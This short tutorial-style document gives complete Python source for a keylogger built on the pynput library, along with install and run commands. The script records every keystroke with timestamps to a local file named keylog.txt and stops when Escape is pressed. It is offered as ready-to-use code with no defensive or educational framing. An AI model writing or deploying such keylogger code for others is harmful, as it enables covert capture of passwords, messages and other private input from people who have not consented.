# Prerequisites
 # Install the pynput library
   pip install pynput

# Keylogger Code 

from pynput import keyboard
import logging

# Setup the log file and format

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
  
  # Stop the keylogger when the Escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Usage
# Save the code in a file, for example, keylogger.py
# Then Run the script:

python keylogger.py

